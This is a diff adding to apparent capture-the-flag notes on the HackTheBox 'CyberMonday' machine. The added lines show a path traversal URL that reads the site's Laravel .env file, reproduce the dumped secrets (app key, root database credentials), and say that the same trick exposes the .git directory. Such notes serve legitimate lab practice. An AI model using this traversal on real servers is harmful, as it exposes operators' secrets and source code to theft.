@@ -93,7 +93,73 @@ we can send some request via webhook :
 http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/0
 http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs
 
+we can get the .env file by calling this url : http://cybermonday.htb/assets../.env
+```bash
+APP_NAME=CyberMonday
+APP_ENV=local
+APP_KEY=base64:EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=
+APP_DEBUG=true
+APP_URL=http://cybermonday.htb
+
+LOG_CHANNEL=stack
+LOG_DEPRECATIONS_CHANNEL=null
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=db
+DB_PORT=3306
+DB_DATABASE=cybermonday
+DB_USERNAME=root
+DB_PASSWORD=root
+
+BROADCAST_DRIVER=log
+CACHE_DRIVER=file
+FILESYSTEM_DISK=local
+QUEUE_CONNECTION=sync
+SESSION_DRIVER=redis
+SESSION_LIFETIME=120
+
+MEMCACHED_HOST=127.0.0.1
+
+REDIS_HOST=redis
+REDIS_PASSWORD=
+REDIS_PORT=6379
+REDIS_PREFIX=laravel_session:
+CACHE_PREFIX=
+
+MAIL_MAILER=smtp
+MAIL_HOST=mailhog
+MAIL_PORT=1025
+MAIL_USERNAME=null
+MAIL_PASSWORD=null
+MAIL_ENCRYPTION=null
+MAIL_FROM_ADDRESS="hello@example.com"
+MAIL_FROM_NAME="${APP_NAME}"
+
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+AWS_DEFAULT_REGION=us-east-1
+AWS_BUCKET=
+AWS_USE_PATH_STYLE_ENDPOINT=false
+
+PUSHER_APP_ID=
+PUSHER_APP_KEY=
+PUSHER_APP_SECRET=
+PUSHER_APP_CLUSTER=mt1
+
+MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
+MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
+
+CHANGELOG_PATH="/mnt/changelog.txt"
+
+REDIS_BLACKLIST=flushall,flushdb
+```
+
+we can get the whole code of the app since we can access the url http://cybermonday.htb/assets../.git
 
 
+http://webhooks-api-beta.cybermonday.htb/jwks.json
+
+https://www.youtube.com/watch?v=ZKrMNwKxitA
 
 
